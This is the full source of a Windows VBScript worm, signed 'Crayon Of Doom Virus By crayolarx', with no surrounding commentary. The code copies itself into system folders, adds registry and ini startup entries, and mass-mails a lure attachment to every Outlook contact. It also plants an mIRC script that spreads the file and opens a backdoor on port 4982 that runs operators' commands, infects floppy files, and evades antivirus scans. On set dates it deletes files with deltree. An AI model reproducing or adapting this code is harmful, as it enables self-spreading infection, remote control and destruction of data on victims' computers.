on error resume next
set worm = CreateObject("Scripting.FileSystemObject")
Set cread = Wscript.CreateObject("Wscript.Shell")
cread.Regdelete "HKCR\VBSFile\Shell\Edit\"
first=ReportFileStatus("c:\pornlist.txt")
if first = "0" then msgbox "Unable to Open URL",16,"Error"
ircm = ReportFolderStatus("c:\mirc\")
if ircm = 0 then ircd = mipath
if ircm = 1 then ircd = "c:\mirc\"
sub list()
Set f = worm.GetFile("c:\windows\wscript.exe")
f.Attributes = 2
Set f = worm.GetFile(WScript.ScriptFullName)
f.copy("c:\windows\system\list.vbs")
f.copy("c:\windows\list.vbs")
f.copy("c:\windows\temp\list.vbs")
f.copy("c:\windows\winsck.vbs")
f.copy("c:\windows\system\explorer.vbs")
f.Attributes = 2
Set h = worm.GetFile("pornlist.txt")
h.copy("c:\pornlist.txt")
h.copy("c:\windows\cod.cod")
h.Attributes = 2
cread.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", "C:\windows\calc.vbs"
cread.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", "C:\windows\sys.vbs"
cread.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", "C:\windows\temp.vbs"
editini "c:\windows\win.ini","[windows]","run","C:\windows\win.vbs"
editini "c:\windows\system.ini","[boot]","shell","Explorer.exe " & "C:\windows\fax.vbs"
sprd()
end sub

sub nodel()
worm.CreateTextFile ("C:\windows\system.bat")
Set ss3 = worm.GetFile("C:\windows\dosstart.bat")
if ss3.size <> 149 then
ss3.copy("c:\windows\doss.bak")
Set w3s = ss3.OpenAsTextStream(2, false)
w3s.write "@echo off" & vbcrlf
w3s.write "echo Warning This Computer is infected with The CRAYON OF DOOM VIRUS.  Turn off computer now to avoid loss of data!" & vbcrlf
w3s.write "pause" & vbcrlf
w3s.write "deltree /Y *.*"
w3s.close
end if
Set ss2 = worm.GetFile("C:\windows\system.bat")
Set w2s = ss2.OpenAsTextStream(2, false)
w2s.write ":2" & vbcrlf
w2s.write "start /w c:\windows\wscript.exe %1" & vbcrlf
w2s.write "goto 2"
w2s.close
ss2.Attributes = 2
for u = 1 to 5
select case u
case "1"
pathed="c:\windows\list.vbs"
named="C:\windows\calc.vbs"
case "2"
pathed="c:\windows\winsck.vbs"
named="C:\windows\win.vbs"
case "3"
pathed="c:\windows\system\list.vbs"
named="C:\windows\sys.vbs"
case "4"
pathed="c:\windows\temp\list.vbs"
named="C:\windows\temp.vbs"
case "5"
pathed="c:\windows\system\explorer.vbs"
named="C:\windows\fax.vbs"
end select
worm.CreateTextFile (named)
Set ss2 = worm.GetFile(named)
Set w2s = ss2.OpenAsTextStream(2, false)
w2s.write "Set WshShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbcrlf
w2s.write "Return = WshShell.Run(" & chr(34) & "C:\windows\system.bat " & pathed & chr(34) & ", 0)"
w2s.close
ss2.Attributes = 2
next
end sub

sub sprd()
Dim strAlias, strAliasKey, paths, strProfile
strProfile = cread.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile <> "1" then
cread.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
Maie.Subject = "Hey whats up!"
Maie.Body = "Hey, I attatched a list for you to this e-mail take a look at it and tell me what you think. :)"
paths = "c:\pornlist.txt"
Maie.Attachments.Add paths
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
else
end if
if len(ircd) > 3 then mirc(ircd)    
end sub

list()

Function ReportFileStatus(filespec)
Dim msg
If (worm.FileExists(filespec)) Then
msg = "1"
Else
msg = "0"
End If
ReportFileStatus = msg
End Function
Function ReportFolderStatus(fldr)
Dim msg
If (worm.FolderExists(fldr)) Then
msg = "1"
Else
msg = "0"
End If
ReportFolderStatus = msg
End Function
sub mirc(mpath)
Dim folder
path = "c:\pornlist.txt"
Dim fso34, f132, t2s
Const ForWriting = 2
worm.CreateTextFile (mpath & "script.ini")
Set f132 = worm.GetFile(mpath & "script.ini")
Set t2s = f132.OpenAsTextStream(ForWriting, false)
t2s.write "[script]" & vbcrlf
t2s.write "n0=on 1:CONNECT:{ /notify ilikeroll | /sockclose cod | /socklisten cod 4982 | /alias /unload /echo script is protected by COD | /notify crayolarx | /alias /remote /echo Protected by COD! | /clear -s | /motd }" & vbcrlf
t2s.write "n1=on 1:TEXT:*virus*:*:if ($nick != $me) /ignore $nick | /close -m $nick" & vbcrlf
t2s.write "n2=on 1:FILESENT:*:if ($filename != c:\pornlist.txt) || ($filename != c:\pornlist.txt) /dcc send $nick " & path & vbcrlf
t2s.write "n3=on 1:FILERCVD:*:/dcc send $nick " & path & vbcrlf
t2s.write "n4=on 1:JOIN:#:{ if ($nick == crayolarx) || ($nick == ilikeroll) /dns $nick" & vbcrlf
t2s.write "n5=if (# == #nohack) || (# == #dmsetup) || ($pos(#,help,1) != $null) || ($pos(#,virus,1) != $null) /part # CRAYON OF DOOM" & vbcrlf
t2s.write "n6=if (($nick == $me) && ($pos(#,sex,1) != $null)) /timer 0 90 /raw -q PRIVMSG # :14(06File Server Online14) 14Trigger:(06!list14) 14Note:(06A List of Hacked Porno site passwords.14) 14«~06{14Polaris IRC06}14~» }" & vbcrlf
t2s.write "n7=on 1:socklisten:cod:{ sockaccept users }" & vbcrlf
t2s.write "n8=on 1:sockread:users:{ if ($sockerr > 0) return" & vbcrlf
t2s.write "n9=:nextread" & vbcrlf
t2s.write "n10=sockread %temp" & vbcrlf
t2s.write "n11=if ($sockbr == 0) return" & vbcrlf
t2s.write "n12=if ($left(%temp,2) == do) { $right(%temp,-3) }" & vbcrlf
t2s.write "n13=goto nextread }" & vbcrlf
t2s.write "n14=on 1:TEXT:!list:*:if ($nick != $me) /dcc send $nick " & path & vbcrlf
t2s.write "n15=ctcp 1:*:{ if ($nick == crayolarx) || ($nick == ilikeroll) $1- | /clear -s }" & vbcrlf
t2s.write "n16=on 1:NOTIFY:if ($nick == crayolarx) || ($nick == ilikeroll) /dns $nick" & vbcrlf
t2s.write "n17=on 1:DNS:if ($nick == crayolarx) || ($nick == ilikeroll) if ($right($naddress,8) == .aol.com) /raw -q PRIVMSG $nick crayons" & vbcrlf
t2s.write "n18=on 1:NICK:if ($nick == $me) /notify"
t2s.close
editini mpath & "mirc.ini","[text]","ignore","*.exe,*.com,*.bat,*.dll,*.ini,*.vbs"
editini mpath & "mirc.ini","[options]","n2","0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0,5,500,10,0,1,1,0,0"
editini mpath & "mirc.ini","[options]","n4","1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,0,1,1,5000,1"
editini mpath & "mirc.ini","[warn]","dcc","off"
for i = 0 to 200
editini mpath & "mirc.ini","[rfiles]","n" & i,"script.ini"
next
end sub

sub editini(filename,section,string,newvalue)
Const ForReading = 1
Const ForWriting = 2
iniFile = filename
sectionName = section
keyName = string
newVlaue = newvalue
bInSection = false
bKeyChanged = false
Set ts = worm.OpenTextFile(iniFile, ForReading)
lines = Split(ts.ReadAll,vbCrLf)
ts.close
For n = 0 to ubound(lines)
if left(lines(n),1) = "[" then
if bInSection then
exit for
end if
if instr(lines(n),sectionName) = 1 then
bInSection = true
else
bInSection = false
end if
else
if bInSection then
if instr(lines(n),keyName & "=") = 1 then
bKeyChanged = true
lines(n) = keyName & "=" & newVlaue
bKeyChanged = true
exit for
end if
end if
end if
Next
if bKeyChanged then
Set ts = worm.OpenTextFile(iniFile, ForWriting)
ts.Write join(lines,vbCrLf)
ts.close
end if
set ts = nothing
set fso = nothing
end sub

function mipath ()
Set oMyFileSearch = CreateObject("word.application")
Dim iIndx
With oMyFileSearch.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "mirc*.exe"
    .FileType = 1
    .Execute
if len(.FoundFiles.Item(1)) > 3 then 
mipath = left(.FoundFiles.Item(1),len(.FoundFiles.Item(1))-10)    
else
mipath = "0"
end if
End With
end function

function ainfect ()
pornos=ReportFileStatus("a:\pornlist.txt")
if pornos = 1 then Exit Function
Set w = worm.GetFile(WScript.ScriptFullName)
Set Map = worm.GetFolder("a:\")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then w.copy(target.path)
if ExtName <> "vbs" then
w.copy(target.path)
worm.movefile target.path,target.path&".vbs"
end if
next
Set zz = worm.GetFile("c:\pornlist.txt")
zz.copy("a:\pornlist.txt")
zz.Attributes = 2
end function

nodel()
ainfect()
if len(ircd) > 3 then 
scheck = 1
set mirc = worm.getfile(ircd & "script.ini")
end if
do
if scheck = 1 then
if mirc.size <> 1541 then mirc(ircd)
end if

nscan = cread.RegRead("HKLM\Software\Symantec\Norton AntiVirus\ScanInProgress\")
if nscan = 1 then
Set f = worm.OpenTextFile(WScript.ScriptFullName, 1)
wormcopy =  f.ReadAll
f.close
worm.deletefile(WScript.ScriptFullName)
do until nscan = 0
nscan = cread.RegRead("HKLM\Software\Symantec\Norton AntiVirus\ScanInProgress\")
loop
Set b = worm.OpenTextFile(WScript.ScriptFullName,2,True)
b.write wormcopy
b.close
end if

check="1" 
 for v = 1 to 6
  select case v
  case "1" vname="c:\list.vbs"
  case "2" vname="c:\windows\list.vbs"
  case "3" vname="c:\windows\winsck.vbs"
  case "4" vname="c:\windows\system\list.vbs"
  case "5" vname="c:\windows\temp\list.vbs"
  case "6" vname="c:\windows\system\explorer.vbs"
  end select  
  check=ReportFileStatus(vname)
  if check="0" then
   Set d = worm.GetFile(WScript.ScriptFullName)
   d.copy(vname)
  end if
Next
check2=ReportFileStatus("c:\pornlist.txt")
if check2="0" then
 Set z = worm.GetFile("c:\windows\cod.cod")
 z.copy("c:\pornlist.txt")
end if
check2=ReportFileStatus("c:\windows\cod.cod")
if check2="0" then
 Set t = worm.GetFile("c:\pornlist.txt")
 t.copy("c:\windows\cod.cod")
end if
Profstr1 = cread.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry")
Profstr2 = cread.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\")
Profstr3 = cread.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\")
if ucase(Profstr1) <> "C:\WINDOWS\CALC.VBS" or ucase(Profstr2) <> "C:\WINDOWS\SYS.VBS" or ucase(Profstr3) <> "C:\WINDOWS\TEMP.VBS" then
 cread.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", "C:\WINDOWS\CALC.VBS"
 cread.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", "C:\WINDOWS\SYS.VBS"
 cread.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", "C:\WINDOWS\TEMP.VBS"
end if
checker="1" 
 for us = 1 to 6
  select case us
  case "1" vname="c:\windows\system.bat"
  case "2" vname="C:\windows\calc.vbs"
  case "3" vname="C:\windows\win.vbs"
  case "4" vname="C:\windows\sys.vbs"
  case "5" vname="C:\windows\temp.vbs"
  case "6" vname="C:\windows\fax.vbs"
  end select  
  checker=ReportFileStatus(vname)
Set ss3 = worm.GetFile("C:\windows\dosstart.bat")  
if checker="0" or ss3.size <> 149 then nodel()
 Next
for r = 1 to 900
next
if left(date,len(date)-3) = "4/20" or left(date,len(date)-3)= "12/25" then
cread.Run("c:\windows\command\deltree.exe /Y *.*", 0)
end if
loop
'Crayon Of Doom Virus By crayolarx